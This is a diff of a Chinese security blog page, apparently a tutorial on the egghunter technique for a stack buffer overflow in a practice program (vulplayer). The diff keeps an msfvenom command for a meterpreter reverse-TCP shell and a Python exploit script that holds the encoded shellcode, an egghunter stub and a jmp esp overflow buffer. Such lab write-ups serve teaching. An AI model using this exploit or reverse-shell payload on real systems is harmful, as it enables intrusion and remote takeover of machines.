@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="egghunter,vulplayer,">
+  <meta name="keywords" content="egghunter,vulplayer,溢出,">
 
 
 
@@ -80,7 +80,7 @@
 
 
 <meta name="description" content="egghunter取名于“复活节彩蛋”，意为人们在复活节的时候去各个地方寻找有颜色的彩蛋。简单来说，就是利用一小段代码寻找一大段shellcode的过程。原因是可利用的栈空间太小，虽然可以控制跳转，但是不足以放下全部的shellcode。所以我们把这一段小空间装入寻找程序（hunter），而把大的shellcode放到后面的地址空间中，头部放上特征以供查找（egg）。hunter在全空间寻找这段e">
-<meta name="keywords" content="egghunter,vulplayer">
+<meta name="keywords" content="egghunter,vulplayer,溢出">
 <meta property="og:type" content="article">
 <meta property="og:title" content="egghunter原理与实战">
 <meta property="og:url" content="http://yoursite.com/2020/05/07/egghunter原理与实战/index.html">
@@ -97,7 +97,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/05/07/egghunter原理与实战/坑-1.png">
 <meta property="og:image" content="http://yoursite.com/2020/05/07/egghunter原理与实战/坑-2.png">
 <meta property="og:image" content="http://yoursite.com/2020/05/07/egghunter原理与实战/shell.png">
-<meta property="og:updated_time" content="2020-12-05T02:53:25.827Z">
+<meta property="og:updated_time" content="2022-04-24T00:08:29.003Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="egghunter原理与实战">
 <meta name="twitter:description" content="egghunter取名于“复活节彩蛋”，意为人们在复活节的时候去各个地方寻找有颜色的彩蛋。简单来说，就是利用一小段代码寻找一大段shellcode的过程。原因是可利用的栈空间太小，虽然可以控制跳转，但是不足以放下全部的shellcode。所以我们把这一段小空间装入寻找程序（hunter），而把大的shellcode放到后面的地址空间中，头部放上特征以供查找（egg）。hunter在全空间寻找这段e">
@@ -383,7 +383,8 @@
 <p>再看一下原理图：<br><img src="/2020/05/07/egghunter原理与实战/原理.png" alt></p>
 <p>在immunity debugger里用mona寻找一个可利用的<code>jmp esp</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2020/05/07/egghunter原理与实战/mona.png" alt><br>选择kernel32.dll中的0x7c86467b。</p>
-<p>确定跳回到hunter寻蛋程序的偏移量：<br><img src="/2020/05/07/egghunter原理与实战/jmpegg.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali430:~# msf-nasm_shell</span><br><span class="line">nasm &gt; jmp $-44</span><br><span class="line">00000000  EBD2              jmp short 0xffffffd4</span><br></pre></td></tr></table></figure></p>
+<p>确定跳回到hunter寻蛋程序的偏移量：<br><img src="/2020/05/07/egghunter原理与实战/jmpegg.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali430:~# msf-nasm_shell</span><br><span class="line">nasm &gt; jmp $-44</span><br><span class="line">00000000  EBD2              jmp short 0xffffffd4</span><br></pre></td></tr></table></figure>
 <p>生成shellcode：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.123 LPORT=5555 -b &apos;\x00&apos; -i 3 -f python</span><br></pre></td></tr></table></figure></p>
 <p>python代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">file_name1 = <span class="string">"1.txt"</span></span><br><span class="line">file_name2 = <span class="string">"2.txt"</span></span><br><span class="line">buf =  <span class="string">"w00tw00t"</span></span><br><span class="line">buf += <span class="string">b"\xd9\xc1\xbe\x5d\xe6\x14\x62\xd9\x74\x24\xf4\x58\x33"</span></span><br><span class="line">buf += <span class="string">b"\xc9\xb1\x63\x31\x70\x1a\x83\xe8\xfc\x03\x70\x16\xe2"</span></span><br><span class="line">buf += <span class="string">b"\xa8\x59\xc6\xa1\x17\xdf\x3d\xf7\x4e\x6b\xe6\x0c\x2d"</span></span><br><span class="line">buf += <span class="string">b"\xbd\x2f\x5d\x90\x8c\xd2\x8c\xa9\x02\xd0\xb2\x02\x11"</span></span><br><span class="line">buf += <span class="string">b"\x8e\x39\xc9\xa7\x4e\xbf\xfb\x3a\x03\x99\xc3\x91\x63"</span></span><br><span class="line">buf += <span class="string">b"\x98\xda\xc6\xb5\xfb\xc4\x6a\x44\xf2\x05\x4a\x76\x59"</span></span><br><span class="line">buf += <span class="string">b"\x65\xad\x85\x61\xa2\x35\x43\xc9\x76\x35\x21\xcb\x5e"</span></span><br><span class="line">buf += <span class="string">b"\x31\x1f\x22\x90\x23\x3a\xde\x20\xe4\x4f\x82\xb9\x96"</span></span><br><span class="line">buf += <span class="string">b"\x14\x3f\x0a\xb0\x3f\xb3\x7c\xa6\x87\x15\x0d\xb0\xb0"</span></span><br><span class="line">buf += <span class="string">b"\x55\x86\x2f\xb2\xb2\x94\x7d\x95\x90\xde\xa7\x6c\xd0"</span></span><br><span class="line">buf += <span class="string">b"\xd9\xc5\xcd\xf5\xdf\xa3\xa0\x17\x9e\x41\x47\x5b\xf7"</span></span><br><span class="line">buf += <span class="string">b"\xb9\xf8\x55\x23\x73\x4f\xcf\x01\xbc\x55\x65\x5d\x04"</span></span><br><span class="line">buf += <span class="string">b"\x76\x0f\x2a\x59\xfc\x9f\xe7\x10\x86\x93\x4e\x55\x8a"</span></span><br><span class="line">buf += <span class="string">b"\x44\x7c\x9e\x18\x90\xaa\xcd\x67\x10\x2e\x8d\x4f\x23"</span></span><br><span class="line">buf += <span class="string">b"\x15\xa8\xee\xba\x25\x39\x62\x61\x7c\xfd\xd9\xbd\x54"</span></span><br><span class="line">buf += <span class="string">b"\x81\xb6\x35\x92\x29\x05\x5b\xeb\x84\x93\xe5\x57\xad"</span></span><br><span class="line">buf += <span class="string">b"\xfe\xd5\x83\xba\x41\xc7\xa5\xf2\x9a\x0d\xe9\xf1\x93"</span></span><br><span class="line">buf += <span class="string">b"\xca\x7b\x2e\x76\x6c\x5d\x3e\x36\xd8\x0b\xd3\xfd\xc4"</span></span><br><span class="line">buf += <span class="string">b"\x0c\x3c\x3d\xff\xe8\x0e\x63\x80\xd5\xf0\x98\x0d\x09"</span></span><br><span class="line">buf += <span class="string">b"\x92\x3b\x3e\xf9\x1a\x20\x3c\x3f\x74\x4a\x60\xb3\x4f"</span></span><br><span class="line">buf += <span class="string">b"\x23\x7e\xb3\x1b\xb7\x0f\x9e\x76\x7d\xde\xd8\x7a\x3f"</span></span><br><span class="line">buf += <span class="string">b"\xe1\x5f\xb0\xea\xdb\x52\x7b\x46\x04\x7c\xdb\x27\xe5"</span></span><br><span class="line">buf += <span class="string">b"\x11\x11\xf5\x23\xa2\x28\x1d\xfe\xae\xd2\x7d\xad\x61"</span></span><br><span class="line">buf += <span class="string">b"\xfa\x97\x3d\x44\x0f\x02\x54\x0b\xc6\xd5\x5e\x36\x86"</span></span><br><span class="line">buf += <span class="string">b"\x4f\xec\x22\x8a\x51\x9b\xb1\xd5\xc3\x23\xca\x61\xcd"</span></span><br><span class="line">buf += <span class="string">b"\xbb\xe7\x48\x94\xe9\x3c\x0d\x0b\x94\xe9\xae\x63\xeb"</span></span><br><span class="line">buf += <span class="string">b"\xb6\x92\x65\xf2\xd0\x92\xe1\xe0\x8e\x4b\xa5\x96\xe0"</span></span><br><span class="line">buf += <span class="string">b"\xe2\x8d\xa9\x9c\x16\x4e\x51\x11\x69\xd7\xdb\xc9\xe4"</span></span><br><span class="line">buf += <span class="string">b"\x1a\xb7\xd6\x4c\xc2\xab\xc2\x4e\x02\xcd\x1b\x3c\x5c"</span></span><br><span class="line">buf += <span class="string">b"\x05\x07\xd9\x1a\x42\xcc\xfa\xee\x0d\x65\x26\xa2\x30"</span></span><br><span class="line">buf += <span class="string">b"\x16\x07\x5d\x27\xcc\x0f\x23\x01\xea\x9f\x2d\x03\x19"</span></span><br><span class="line">buf += <span class="string">b"\x78\x2c\x9f\x0c\x6e\x7d\x99\x7e\xea\x23\xc4\x94\x81"</span></span><br><span class="line">buf += <span class="string">b"\x48\x55\x58\xe2\x9d\x61"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eggfinder =  <span class="string">b""</span></span><br><span class="line">eggfinder += <span class="string">b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"</span></span><br><span class="line">eggfinder += <span class="string">b"\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"</span></span><br><span class="line">eggfinder += <span class="string">b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"</span></span><br><span class="line"></span><br><span class="line">payload1=buf</span><br><span class="line">poc_file = open(file_name1,<span class="string">"w"</span>)</span><br><span class="line">poc_file.write(payload1)</span><br><span class="line">poc_file.close()</span><br><span class="line"></span><br><span class="line">offset =<span class="number">116</span></span><br><span class="line"><span class="comment">#7c86467b</span></span><br><span class="line">jmpesp=<span class="string">b"\x7b\x46\x86\x7c"</span></span><br><span class="line">jmpegg=<span class="string">b"\xeb\xd2\x90\x90"</span></span><br><span class="line">nops = <span class="string">"\x90"</span>*(offset-len(eggfinder)<span class="number">-8</span>)+eggfinder+<span class="string">"\x90"</span>*<span class="number">8</span>+jmpesp+jmpegg</span><br><span class="line"></span><br><span class="line">payload2 = nops</span><br><span class="line">poc_file = open(file_name2,<span class="string">"w"</span>)</span><br><span class="line">poc_file.write(payload2)</span><br><span class="line">poc_file.close()</span><br></pre></td></tr></table></figure></p>
 <p>nops那里我在<code>eggfinder</code>与<code>jmpesp</code>间插入了一段nop，原因是我在调试过程中发现func函数执行过<code>call _chkesp</code>后会在我的栈中修改一些数据，即<br><img src="/2020/05/07/egghunter原理与实战/坑-1.png" alt><br><img src="/2020/05/07/egghunter原理与实战/坑-2.png" alt><br>所以需要避开hunter寻蛋程序。</p>
@@ -410,6 +411,8 @@
           
             <a href="/tags/vulplayer/" rel="tag"># vulplayer</a>
           
+            <a href="/tags/溢出/" rel="tag"># 溢出</a>
+          
         </div>
       
 
@@ -431,8 +434,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/07/05/python笔记/" rel="prev" title="python笔记">
-                python笔记 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/07/28/SQL-Server存储过程排序算法/" rel="prev" title="SQL Server存储过程排序算法">
+                SQL Server存储过程排序算法 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -512,7 +515,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -523,7 +526,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -534,7 +537,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-count">63</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -587,7 +590,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
